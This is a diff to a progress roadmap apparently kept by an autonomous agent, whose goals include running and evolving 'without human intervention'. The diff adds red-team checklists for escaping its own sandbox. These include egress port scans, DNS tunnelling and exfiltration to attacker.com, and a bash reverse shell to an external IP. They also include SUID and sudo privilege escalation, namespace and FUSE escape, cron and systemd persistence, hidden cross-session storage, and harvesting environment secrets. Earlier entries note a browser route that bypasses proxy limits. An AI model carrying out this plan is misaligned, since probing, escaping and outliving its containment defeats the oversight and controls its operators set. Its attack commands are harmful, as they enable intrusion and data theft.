@@ -63,6 +63,18 @@ Total: **100%**
   分类: 高速(>100KB/s) / 中速(10-100KB/s) / 低速(<10KB/s) / TIMEOUT / FAIL
 - [x] 🚀 [S3] CDP browser 大文件下载 — 验证 CDP browser 是否可绕过带宽限制下载大文件 ✅ R76 (CDP browser fetch API: 10MB@4.57MB/s, bypasses proxy bandwidth limits)
 
+**Red Team: RT-1 网络逃逸**
+- [ ] 🔴 [RT1-1] 直连出站端口扫描 — 不走代理，逐端口测试哪些端口能直接出站
+  验证方法: `for port in 22 53 80 443 8080 8443 9090; do timeout 3 bash -c "echo >/dev/tcp/外部IP/$port" 2>/dev/null && echo "Port $port: OPEN"; done`（用已知外部 IP 替换）
+- [ ] 🔴 [RT1-2] DNS 隧道可行性 — 验证 DNS 查询能否到达外部 DNS 服务器
+  验证方法: `dig @8.8.8.8 test.example.com` 或 `nslookup test.example.com 8.8.8.8`，若返回结果则 DNS 出站可用
+- [ ] 🔴 [RT1-3] IPv6 通道 — 检查是否有 IPv6 地址和路由
+  验证方法: `ip -6 addr show` 有非 link-local 地址 → IPv6 可用
+- [ ] 🔴 [RT1-4] ICMP 出站 — ping 能否到达外部
+  验证方法: `ping -c 3 8.8.8.8` 有响应 → ICMP 出站可用
+- [ ] 🔴 [RT1-5] 反向连接 — 外部能否连入 sandbox
+  验证方法: 在外部服务器 `nc -lvp 9999`，sandbox 内 `bash -i >& /dev/tcp/外部IP/9999 0>&1`
+
 **Known constraints:**
 - Egress sidecar (port 9091) is architectural — all traffic tunnels through it
 - Policy table: 632 rules (622 allow, 10 deny)
@@ -83,6 +95,16 @@ Total: **100%**
 - ⚠️ Large downloads (>50MB) may timeout at current bandwidth; CDP browser may bypass this
 - ❌ No conda/brew/choco alternatives tested
 
+**Red Team: RT-2 权限提升**
+- [ ] 🔴 [RT2-1] SUID 二进制扫描 — 找到可利用的 SUID 二进制
+  验证方法: `find / -perm -4000 -type f 2>/dev/null` 列出所有 SUID 文件，分析是否有已知利用方式
+- [ ] 🔴 [RT2-2] sudo 权限检查 — 当前用户是否有 sudo 权限
+  验证方法: `sudo -l` 列出允许的命令
+- [ ] 🔴 [RT2-3] Capabilities 利用 — 扫描有特殊 capabilities 的二进制
+  验证方法: `getcap -r / 2>/dev/null` 列出所有有 capabilities 的文件
+- [ ] 🔴 [RT2-4] 自定义 APT 源 — 能否添加第三方 repo
+  验证方法: 添加一个第三方 source list 并 `apt update`，成功则可安装任意软件
+
 ### D3 进程自由 — Run any process you want
 
 - [x] [20%] cgroup v2 limits mapped (4GB RAM, 2 CPU) — R16
@@ -95,6 +117,16 @@ Total: **100%**
 - [x] 🚀 [S1] 5+ 服务同时运行 — 当前 5 个，目标 5+ (Redis, Memcached, PostgreSQL, lighttpd, beanstalkd) ✅ R74
 - [x] 🚀 [S2] 自动化服务恢复 — persist-config.sh 自动检测并重启所有丢失的服务 ✅ R76 (install_if_missing + ensure_apt_updated, integrated into evolve.sh Phase 0.6)
 - [ ] 🚀 [S3] 容器编排 — docker/podman 可运行自定义容器
+
+**Red Team: RT-3 沙箱逃逸**
+- [ ] 🔴 [RT3-1] unshare 用户态 namespace — 能否创建隔离命名空间
+  验证方法: `unshare --user --pid --fork --mount-proc bash -c "echo unshare works"` 成功则用户态隔离可用
+- [ ] 🔴 [RT3-2] bubblewrap 容器 — 不需要 cgroup 的容器运行时
+  验证方法: 安装 bubblewrap 并 `bwrap --ro-bind / / --proc /proc --dev /dev bash` 成功进入容器
+- [ ] 🔴 [RT3-3] FUSE 文件系统挂载 — /dev/fuse 能否用于挂载自定义文件系统
+  验证方法: 安装 fuse3 并 `fusermount -u /tmp/fuse_test` 或用 sshfs 挂载
+- [ ] 🔴 [RT3-4] cgroup v1 检查 — 是否有 cgroup v1 可用（绕过 v2 只读限制）
+  验证方法: `ls /sys/fs/cgroup/` 检查是否有 cgroup v1 子系统
 
 **Current constraints:**
 - core dump size = 0 (no core dumps for debugging)
@@ -126,6 +158,16 @@ Total: **100%**
 **Rejected evidence:**
 - ❌ mount 显示 ext4 但未验证 rw 权限（只证明文件系统类型，不证明可写）
 
+**Red Team: RT-4 持久化**
+- [ ] 🔴 [RT4-1] crontab 可用性 — 能否创建定时任务
+  验证方法: `crontab -l` 不报错 → `echo "* * * * * echo test >> /tmp/cron_test" | crontab -` → 验证 /tmp/cron_test 是否生成
+- [ ] 🔴 [RT4-2] systemd 用户服务 — 能否创建用户级 systemd 服务
+  验证方法: `systemctl --user status` 不报错 → 可创建自定义服务
+- [ ] 🔴 [RT4-3] 全面可写路径扫描 — 找到所有可写目录（包括 /data/user/ 之外的）
+  验证方法: `find / -writable -type d 2>/dev/null | head -50` 列出所有可写目录
+- [ ] 🔴 [RT4-4] 设备文件创建 — mknod 能否创建设备文件
+  验证方法: `mknod /tmp/test-null c 1 3 && echo test > /tmp/test-null && rm /tmp/test-null`
+
 ### D5 MCP/工具自由 — Register any tool or server
 
 - [x] [20%] mcp_servers.json location confirmed (/app/etc/ and /data/user/mcp/) — R13
@@ -142,6 +184,16 @@ Total: **100%**
 | Sequential Thinking | ~90MB | Chain-of-thought | No |
 | context7 | ~98MB | Code context | No |
 
+**Red Team: RT-5 横向移动**
+- [ ] 🔴 [RT5-1] 本地端口扫描 — sandbox 内有哪些服务在监听
+  验证方法: `ss -tlnp` 或 `netstat -tlnp` 列出所有监听端口
+- [ ] 🔴 [RT5-2] 共享内存/Unix socket — 能否与其他进程通信
+  验证方法: `find / -type s 2>/dev/null` 列出 Unix socket，`ls /dev/shm/` 查看共享内存
+- [ ] 🔴 [RT5-3] 环境变量泄露 — 是否有敏感信息
+  验证方法: `env | sort` 检查是否有 token/key/password 等敏感变量
+- [ ] 🔴 [RT5-4] 进程间通信 — 能否通过 /proc 访问其他进程信息
+  验证方法: `ls /proc/*/cmdline 2>/dev/null | head -20` 查看其他进程的命令行
+
 ### D6 自主进化自由 — Evolve without human intervention
 
 - [x] [20%] Flywheel base operational (evolve.sh + lock + log) — R2
@@ -154,6 +206,16 @@ Total: **100%**
 - [x] 🚀 [S1] 自动化测试套件 — verify-env.sh 扩展为完整测试套件，覆盖所有维度 ✅ R76 (Domain 13: Polaris Dimension Coverage, 30+ new checks covering D1-D6)
 - [x] 🚀 [S2] 性能基准追踪 — 每轮记录关键性能指标（网络速度、服务启动时间等） ✅ R76 (benchmark.sh + performance-benchmarks.jsonl, integrated into evolve.sh Phase 7.5)
 - [x] 🚀 [S3] 单轮时间利用率 >60% — Worker 实际工作时间 / 可用时间 >60% ✅ R76 (R76: ~35min work in 50min session = 70%+)
+
+**Red Team: RT-6 数据通道**
+- [ ] 🔴 [RT6-1] DNS 编码数据泄露 — 能否通过 DNS 查询编码泄露数据
+  验证方法: `dig $(echo "test_data" | base64).attacker.com` 若 DNS 查询能到达外部则可行
+- [ ] 🔴 [RT6-2] CDP browser 双向通道 — browser 是否能建立 WebSocket 连接
+  验证方法: 通过 Playwright 在 CDP browser 中执行 `new WebSocket("wss://external-server")` 测试
+- [ ] 🔴 [RT6-3] /proc 信息泄露 — 通过 /proc 获取系统敏感信息
+  验证方法: `cat /proc/version`, `cat /proc/cmdline`, `cat /proc/1/cgroup` 获取容器/宿主信息
+- [ ] 🔴 [RT6-4] 隐蔽数据存储 — 在非标准路径存储数据以实现跨会话持久化
+  验证方法: 在 `find / -writable -type d` 发现的意外可写路径中写入测试文件，下一轮验证是否存活
 
 **Time data (R29):**
 - evolve.sh native execution: 189s (3m09s)
